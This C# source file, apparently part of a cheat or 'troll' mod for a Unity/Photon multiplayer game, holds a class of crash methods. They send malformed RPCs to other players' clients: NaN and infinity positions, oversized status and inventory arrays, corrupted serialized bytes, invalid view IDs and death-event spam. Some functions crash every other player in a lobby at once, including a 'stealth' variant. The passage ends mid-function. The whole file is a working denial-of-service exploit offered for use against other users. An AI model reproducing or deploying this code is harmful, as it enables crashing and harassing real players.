using System;
using System.Collections;
using System.Collections.Generic;
using System.Reflection;
using UnityEngine;
using Photon.Pun;
using Debug = UnityEngine.Debug;

namespace _1v1.lol_cheat.Troll
{
	public static class CrashMethods
	{
		public static void CrashPlayer_TriggerRelayBounds(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				TriggerRelay[] array = Object.FindObjectsByType<TriggerRelay>((FindObjectsSortMode)0);
				int num = 0;
				TriggerRelay[] array2 = array;
				foreach (TriggerRelay val in array2)
				{
					if (!((Object)(object)val != (Object)null))
					{
						continue;
					}
					FieldInfo field = typeof(TriggerRelay).GetField("view", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					PhotonView val2 = null;
					val2 = (PhotonView)((!(field != null)) ? ((object)((Component)val).GetComponent<PhotonView>()) : ((object)/*isinst with value type is only supported in some contexts*/));
					if ((Object)(object)val2 != (Object)null && val2.ViewID != 0)
					{
						int num2 = ((Component)val).transform.childCount + 9999;
						try
						{
							val2.RPC("RPCA_Trigger", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { num2 });
							num++;
						}
						catch
						{
						}
						try
						{
							val2.RPC("RPCA_TriggerWithTarget", ((MonoBehaviourPun)target).photonView.Owner, new object[2] { num2, -1 });
							num++;
						}
						catch
						{
						}
					}
				}
				object arg = num;
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)string.Format("[Crash] Sent {0} TriggerRelay bounds violations to {1}", arg, ((owner != null) ? owner.NickName : null) ?? "Unknown"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] TriggerRelay bounds crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_TornadoNullRefs(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				Tornado[] array = Object.FindObjectsByType<Tornado>((FindObjectsSortMode)0);
				int num = 0;
				Tornado[] array2 = array;
				foreach (Tornado val in array2)
				{
					if (!((Object)(object)val != (Object)null))
					{
						continue;
					}
					PhotonView component = ((Component)val).GetComponent<PhotonView>();
					if ((Object)(object)component == (Object)null && (Object)(object)((Component)val).transform.parent != (Object)null)
					{
						component = ((Component)((Component)val).transform.parent).GetComponent<PhotonView>();
					}
					if ((Object)(object)component != (Object)null && component.ViewID != 0)
					{
						int num2 = -1;
						try
						{
							component.RPC("RPCA_ThrowPlayer", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { num2 });
							num++;
						}
						catch
						{
						}
						try
						{
							component.RPC("RPCA_CaptureCharacter", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { num2 });
							num++;
						}
						catch
						{
						}
						try
						{
							component.RPC("RPCA_InitTornado", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { num2 });
							num++;
						}
						catch
						{
						}
					}
				}
				object arg = num;
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)string.Format("[Crash] Sent {0} Tornado null refs to {1}", arg, ((owner != null) ? owner.NickName : null) ?? "Unknown"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Tornado null ref crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_RescueHookNull(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				RescueHook[] array = Object.FindObjectsByType<RescueHook>((FindObjectsSortMode)0);
				int num = 0;
				RescueHook[] array2 = array;
				foreach (RescueHook val in array2)
				{
					if (!((Object)(object)val != (Object)null))
					{
						continue;
					}
					PhotonView component = ((Component)val).GetComponent<PhotonView>();
					if ((Object)(object)component == (Object)null && (Object)(object)((Component)val).transform.parent != (Object)null)
					{
						component = ((Component)((Component)val).transform.parent).GetComponent<PhotonView>();
					}
					if ((Object)(object)component != (Object)null && component.ViewID != 0)
					{
						try
						{
							component.RPC("RPCA_RescueCharacter", ((MonoBehaviourPun)target).photonView.Owner, new object[1]);
							num++;
						}
						catch
						{
						}
					}
				}
				object arg = num;
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)string.Format("[Crash] Sent {0} RescueHook null refs to {1}", arg, ((owner != null) ? owner.NickName : null) ?? "Unknown"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] RescueHook null crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_SpiderNull(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				Spider[] array = Object.FindObjectsByType<Spider>((FindObjectsSortMode)0);
				int num = 0;
				Spider[] array2 = array;
				foreach (Spider val in array2)
				{
					if (!((Object)(object)val != (Object)null))
					{
						continue;
					}
					PhotonView photonView = val.photonView;
					if ((Object)(object)photonView != (Object)null)
					{
						try
						{
							photonView.RPC("RPCA_GrabCharacter", ((MonoBehaviourPun)target).photonView.Owner, new object[1]);
							num++;
						}
						catch
						{
						}
					}
				}
				object arg = num;
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)string.Format("[Crash] Sent {0} Spider null refs to {1}", arg, ((owner != null) ? owner.NickName : null) ?? "Unknown"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Spider null crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_CharacterGrabbingNull(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				try
				{
					((MonoBehaviourPun)target).photonView.RPC("RPCA_GrabAttach", ((MonoBehaviourPun)target).photonView.Owner, new object[3]
					{
						null,
						0,
						Vector3.zero
					});
					Player owner = ((MonoBehaviourPun)target).photonView.Owner;
					Debug.Log((object)("[Crash] Sent CharacterGrabbing null ref to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] CharacterGrabbing null crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_GetFedItemInvalid(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || ((MonoBehaviourPun)target).photonView.IsMine)
			{
				return;
			}
			try
			{
				try
				{
					((MonoBehaviourPun)target).photonView.RPC("GetFedItemRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { -1 });
				}
				catch
				{
				}
				try
				{
					((MonoBehaviourPun)target).photonView.RPC("GetFedItemRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { 999999 });
				}
				catch
				{
				}
				Debug.Log((object)("[Crash] Sent invalid GetFedItemRPC  IMMEDIATE CRASH (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] GetFedItemRPC crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_DirectPlayerRPCs(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				PhotonView val = PhotonView.Find(-1);
				for (int i = 0; i < 10; i++)
				{
					try
					{
						((MonoBehaviourPun)target).photonView.RPC("RPCA_GrabAttach", ((MonoBehaviourPun)target).photonView.Owner, new object[3]
						{
							val,
							0,
							Vector3.zero
						});
					}
					catch
					{
					}
					try
					{
						((MonoBehaviourPun)target).photonView.RPC("RPCA_StartCarry", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { val });
					}
					catch
					{
					}
					try
					{
						((MonoBehaviourPun)target).photonView.RPC("WarpPlayerRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2]
						{
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							false
						});
					}
					catch
					{
					}
					try
					{
						((MonoBehaviourPun)target).photonView.RPC("RPCA_Stick", ((MonoBehaviourPun)target).photonView.Owner, new object[5]
						{
							(object)(BodypartType)4,
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							(object)(STATUSTYPE)0,
							float.NaN
						});
					}
					catch
					{
					}
					try
					{
						((MonoBehaviourPun)target).photonView.RPC("RPCA_AddForceAtPosition", ((MonoBehaviourPun)target).photonView.Owner, new object[3]
						{
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							(object)new Vector3(float.NaN, float.NaN, float.NaN),
							float.NaN
						});
					}
					catch
					{
					}
					try
					{
						((MonoBehaviourPun)target).photonView.RPC("GetFedItemRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { -1 });
					}
					catch
					{
					}
					try
					{
						((MonoBehaviourPun)target).photonView.RPC("GetFedItemRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { 999999 });
					}
					catch
					{
					}
				}
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)("[Crash] Sent direct player RPC crashes to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Direct player RPC crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_AllNullRefs(Character target, bool includeSelf = false)
		{
			if (!((Object)(object)target == (Object)null) && !((Object)(object)((MonoBehaviourPun)target).photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)("[Crash] Sending ALL null reference exploits to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				CrashPlayer_DirectPlayerRPCs(target);
				CrashPlayer_TriggerRelayBounds(target);
				CrashPlayer_TornadoNullRefs(target);
				CrashPlayer_RescueHookNull(target);
				CrashPlayer_SpiderNull(target);
				CrashPlayer_CharacterGrabbingNull(target);
				CrashPlayer_GetFedItemInvalid(target);
			}
		}

		public static void CrashPlayer_MaxArraySize(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				Type type = Type.GetType("StatusSyncData");
				if (!(type != null) || !(type.GetConstructor(new Type[0]) != null))
				{
					return;
				}
				object obj = Activator.CreateInstance(type);
				FieldInfo field = type.GetField("statusList");
				if (field != null)
				{
					List<float> list = new List<float>();
					int num = 1000000;
					for (int i = 0; i < num; i++)
					{
						list.Add(float.MaxValue);
					}
					field.SetValue(obj, list);
					MethodInfo method = typeof(IBinarySerializable).GetMethod("ToManagedArray", BindingFlags.Static | BindingFlags.Public);
					if (method != null)
					{
						byte[] array = (byte[])method.MakeGenericMethod(type).Invoke(null, new object[1] { obj });
						((MonoBehaviourPun)target).photonView.RPC("SyncStatusesRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { array });
						Debug.Log((object)$"[Crash] Sent maximum array size ({num} elements)  MEMORY EXHAUSTION CRASH (target: {((MonoBehaviourPun)target).photonView.Owner.NickName})");
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Max array size failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Inventory(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[10000];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = byte.MaxValue;
				}
				((MonoBehaviourPun)target.player).photonView.RPC("SyncInventoryRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2] { array, true });
				try
				{
					Type type = Type.GetType("InventorySyncData");
					if (type != null && type.GetConstructor(new Type[0]) != null)
					{
						object obj = Activator.CreateInstance(type);
						FieldInfo field = type.GetField("slotCount");
						FieldInfo field2 = type.GetField("slots");
						if (field != null && field2 != null)
						{
							field.SetValue(obj, byte.MaxValue);
							object[] array2 = new object[255];
							for (int j = 0; j < 255; j++)
							{
								array2[j] = new object();
							}
							field2.SetValue(obj, array2);
							MethodInfo method = typeof(IBinarySerializable).GetMethod("ToManagedArray", BindingFlags.Static | BindingFlags.Public);
							if (method != null)
							{
								byte[] array3 = (byte[])method.MakeGenericMethod(type).Invoke(null, new object[1] { obj });
								((MonoBehaviourPun)target.player).photonView.RPC("SyncInventoryRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2] { array3, true });
							}
						}
					}
				}
				catch
				{
				}
				Debug.Log((object)("[Crash] Sent corrupted inventory data  MEMORY/DESERIALIZATION CRASH (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Inventory crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_StatusArrayBounds(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				Type type = Type.GetType("StatusSyncData");
				if (type != null && type.GetConstructor(new Type[0]) != null)
				{
					object obj = Activator.CreateInstance(type);
					FieldInfo field = type.GetField("statusList");
					if (field != null)
					{
						List<float> list = new List<float>();
						for (int i = 0; i < 50000; i++)
						{
							list.Add(float.MaxValue);
						}
						field.SetValue(obj, list);
						MethodInfo method = typeof(IBinarySerializable).GetMethod("ToManagedArray", BindingFlags.Static | BindingFlags.Public);
						if (method != null)
						{
							byte[] array = (byte[])method.MakeGenericMethod(type).Invoke(null, new object[1] { obj });
							((MonoBehaviourPun)target).photonView.RPC("SyncStatusesRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { array });
						}
					}
				}
				Debug.Log((object)("[Crash] Sent oversized status array  MEMORY EXHAUSTION CRASH (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Status array bounds crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Deserialization(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[50000];
				BitConverter.GetBytes(int.MaxValue).CopyTo(array, 0);
				for (int i = 4; i < array.Length; i++)
				{
					array[i] = byte.MaxValue;
				}
				((MonoBehaviourPun)target.player).photonView.RPC("SyncInventoryRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2] { array, true });
				((MonoBehaviourPun)target).photonView.RPC("SyncStatusesRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { array });
				((MonoBehaviourPun)target).photonView.RPC("SyncAfflictionsRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { array });
				Debug.Log((object)("[Crash] Sent malformed deserialization data  DESERIALIZATION CRASH (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Deserialization crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_NullReferences(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				PhotonView val = PhotonView.Find(-1);
				if (target.refs != null && (Object)(object)target.refs.carriying != (Object)null)
				{
					((MonoBehaviourPun)target).photonView.RPC("RPCA_StartCarry", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { val });
				}
				try
				{
					CharacterSpawner val2 = Object.FindFirstObjectByType<CharacterSpawner>();
					if ((Object)(object)val2 != (Object)null && (Object)(object)((MonoBehaviourPun)val2).photonView != (Object)null)
					{
						object obj = Activator.CreateInstance(typeof(ReconnectData));
						((MonoBehaviourPun)val2).photonView.RPC("SpawnPlayerRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2] { false, obj });
					}
				}
				catch
				{
				}
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)("[Crash] Sent null references to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Null reference crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_DivisionByZero(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				((MonoBehaviourPun)target).photonView.RPC("RPCA_AddForceAtPosition", ((MonoBehaviourPun)target).photonView.Owner, new object[3]
				{
					Vector3.zero,
					target.Center,
					0f
				});
				((MonoBehaviourPun)target).photonView.RPC("WarpPlayerRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2]
				{
					(object)new Vector3(float.NaN, float.NaN, float.NaN),
					false
				});
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)("[Crash] Sent NaN/Division by zero to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Division by zero crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_ExtremeValues(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				for (int i = 0; i < 5; i++)
				{
					((MonoBehaviourPun)target).photonView.RPC("RPCA_Fall", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { float.MaxValue });
					((MonoBehaviourPun)target).photonView.RPC("WarpPlayerRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2]
					{
						(object)new Vector3(float.NaN, float.NaN, float.NaN),
						false
					});
					((MonoBehaviourPun)target).photonView.RPC("WarpPlayerRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2]
					{
						(object)new Vector3(float.PositiveInfinity, float.PositiveInfinity, float.PositiveInfinity),
						false
					});
					((MonoBehaviourPun)target).photonView.RPC("WarpPlayerRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2]
					{
						(object)new Vector3(float.NegativeInfinity, float.NegativeInfinity, float.NegativeInfinity),
						false
					});
					((MonoBehaviourPun)target).photonView.RPC("RPCA_Stick", ((MonoBehaviourPun)target).photonView.Owner, new object[5]
					{
						(object)(BodypartType)4,
						(object)new Vector3(float.PositiveInfinity, float.PositiveInfinity, float.PositiveInfinity),
						(object)new Vector3(float.NaN, float.NaN, float.NaN),
						(object)(STATUSTYPE)0,
						float.MaxValue
					});
					((MonoBehaviourPun)target).photonView.RPC("RPCA_AddForceAtPosition", ((MonoBehaviourPun)target).photonView.Owner, new object[3]
					{
						(object)new Vector3(float.MaxValue, float.MaxValue, float.MaxValue),
						(object)new Vector3(float.NaN, float.NaN, float.NaN),
						float.MaxValue
					});
				}
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.Log((object)("[Crash] Sent extreme values to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Extreme values crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_InvalidPhotonView(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				PhotonView val = PhotonView.Find(-1);
				if (target.refs != null && (Object)(object)target.refs.carriying != (Object)null && (Object)(object)((MonoBehaviourPun)target).photonView != (Object)null)
				{
					((MonoBehaviourPun)target).photonView.RPC("RPCA_StartCarry", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { val });
					Player owner = ((MonoBehaviourPun)target).photonView.Owner;
					Debug.Log((object)("[Crash] Sent invalid PhotonView to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Invalid PhotonView crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Statuses(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[10000];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(i % 256);
				}
				((MonoBehaviourPun)target).photonView.RPC("SyncStatusesRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { array });
				Debug.Log((object)("[Crash] Sent corrupted status data  DESERIALIZATION CRASH (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Status crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Afflictions(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[20000];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = 170;
				}
				((MonoBehaviourPun)target).photonView.RPC("SyncAfflictionsRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { array });
				Debug.Log((object)("[Crash] Sent corrupted affliction data  DESERIALIZATION CRASH (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Affliction crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_Thorns(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				byte[] array = new byte[5000];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = 127;
				}
				((MonoBehaviourPun)target).photonView.RPC("SyncThornsRPC_Remote", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { array });
				Debug.Log((object)("[Crash] Sent corrupted thorn data  DESERIALIZATION CRASH (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Thorn crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_ReconnectData(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				CharacterSpawner val = Object.FindFirstObjectByType<CharacterSpawner>();
				if ((Object)(object)val != (Object)null && (Object)(object)((MonoBehaviourPun)val).photonView != (Object)null)
				{
					object obj = Activator.CreateInstance(typeof(ReconnectData));
					((MonoBehaviourPun)val).photonView.RPC("SpawnPlayerRPC", ((MonoBehaviourPun)target).photonView.Owner, new object[2] { false, obj });
					Debug.Log((object)("[Crash] Sent invalid ReconnectData  SPAWN CRASH (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] ReconnectData crash failed: " + ex.Message));
			}
		}

		public static void CrashPlayer_AllMethods(Character target, bool includeSelf = false)
		{
			if (!((Object)(object)target == (Object)null) && !((Object)(object)((MonoBehaviourPun)target).photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.LogWarning((object)("[Crash] ULTIMATE CRASH - All immediate methods to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				CrashPlayer_DirectPlayerRPCs(target);
				CrashPlayer_AllNullRefs(target);
				CrashPlayer_InvalidPhotonView(target);
				CrashPlayer_NullReferences(target);
				CrashPlayer_MaxArraySize(target);
				CrashPlayer_Inventory(target);
				CrashPlayer_StatusArrayBounds(target);
				CrashPlayer_Deserialization(target);
				CrashPlayer_Statuses(target);
				CrashPlayer_Afflictions(target);
				CrashPlayer_Thorns(target);
				CrashPlayer_ReconnectData(target);
				CrashPlayer_DivisionByZero(target);
				CrashPlayer_ExtremeValues(target);
			}
		}

		public static void CrashPlayer_Ultimate(Character target, bool includeSelf = false)
		{
			if (!((Object)(object)target == (Object)null) && !((Object)(object)((MonoBehaviourPun)target).photonView == (Object)null) && !TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				Player owner = ((MonoBehaviourPun)target).photonView.Owner;
				Debug.LogWarning((object)("[Crash] ULTIMATE CRASH initiated to " + (((owner != null) ? owner.NickName : null) ?? "Unknown")));
				CrashPlayer_AllMethods(target);
			}
		}

		public static void CrashPlayer_ObjectSpam(Character target, bool includeSelf = false)
		{
			if ((Object)(object)target == (Object)null || (Object)(object)((MonoBehaviourPun)target).photonView == (Object)null || TrollHelpers.ShouldSkipPlayer(target, includeSelf, isCrashEffect: true))
			{
				return;
			}
			try
			{
				for (int i = 0; i < 100; i++)
				{
					try
					{
						((MonoBehaviourPun)target).photonView.RPC("RPCA_Die", ((MonoBehaviourPun)target).photonView.Owner, new object[1] { target.Center });
					}
					catch
					{
					}
				}
				Debug.Log((object)("[Crash] Sent RPCA_Die spam  MEMORY EXHAUSTION (target: " + ((MonoBehaviourPun)target).photonView.Owner.NickName + ")"));
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Crash] Object spam failed: " + ex.Message));
			}
		}

		public static void CrashAllPlayersAndDisconnect()
		{
			try
			{
				Debug.Log((object)"[Crash] Starting crash all players in lobby...");
				List<Character> list = new List<Character>();
				try
				{
					MethodInfo method = typeof(PlayerHandler).GetMethod("GetAllPlayerCharacters", BindingFlags.Static | BindingFlags.Public);
					if (method != null && method.Invoke(null, null) is IEnumerable enumerable)
					{
						foreach (Character item in enumerable)
						{
							Character val = item;
							if ((Object)(object)val != (Object)null && (Object)(object)((MonoBehaviourPun)val).photonView != (Object)null)
							{
								list.Add(val);
							}
						}
					}
				}
				catch
				{
					Character[] array = Object.FindObjectsByType<Character>((FindObjectsSortMode)0);
					foreach (Character val2 in array)
					{
						if ((Object)(object)val2 != (Object)null && (Object)(object)((MonoBehaviourPun)val2).photonView != (Object)null)
						{
							list.Add(val2);
						}
					}
				}
				Debug.Log((object)$"[Crash] Found {list.Count} players to crash");
				foreach (Character item2 in list)
				{
					if ((Object)(object)item2 != (Object)null && (Object)(object)((MonoBehaviourPun)item2).photonView != (Object)null && !((MonoBehaviourPun)item2).photonView.IsMine)
					{
						Player owner = ((MonoBehaviourPun)item2).photonView.Owner;
						Debug.Log((object)("[Crash] Crashing " + (((owner != null) ? owner.NickName : null) ?? "Unknown") + "..."));
						CrashPlayer_AllMethods(item2);
					}
				}
				Debug.Log((object)"[Crash] Crash all players complete!");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Crash] Error in CrashAllPlayersAndDisconnect: " + ex.Message + "\n" + ex.StackTrace));
			}
		}

		public static void CrashAllPlayersStealth()
		{
			try
			{
				Debug.Log((object)"[Stealth Crash] Starting stealth crash on all players...");
				List<Character> list = new List<Character>();
				try
				{
					MethodInfo method = typeof(PlayerHandler).GetMethod("GetAllPlayerCharacters", BindingFlags.Static | BindingFlags.Public);
					if (method != null && method.Invoke(null, null) is IEnumerable enumerable)
					{
						foreach (Character item in enumerable)
						{
							Character val = item;
							if ((Object)(object)val != (Object)null && (Object)(object)((MonoBehaviourPun)val).photonView != (Object)null)
							{
								list.Add(val);
							}
						}
					}
				}
				catch
				{
					Character[] array = Object.FindObjectsByType<Character>((FindObjectsSortMode)0);
					foreach (Character val2 in array)
					{
						if ((Object)(object)val2 != (Object)null && (Object)(object)((MonoBehaviourPun)val2).photonView != (Object)null)
						{
							list.Add(val2);
						}
					}
				}
				foreach (Character item2 in list)
				{
					if ((Object)(object)item2 != (Object)null && (Object)(object)((MonoBehaviourPun)item2).photonView != (Object)null && !((MonoBehaviourPun)item2).photonView.IsMine)
					{
						CrashPlayer_TriggerRelayBounds(item2);
						CrashPlayer_TornadoNullRefs(item2);
						CrashPlayer_RescueHookNull(item2);
					}
				}
				Debug.Log((object)"[Stealth Crash] Stealth crash initiated on all players!");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[Stealth Crash] Error: " + ex.Message + "\n" + ex.StackTrace));
			}
		}

		public static void KickPlayer(Character target, bool includeSelf = false)
		{
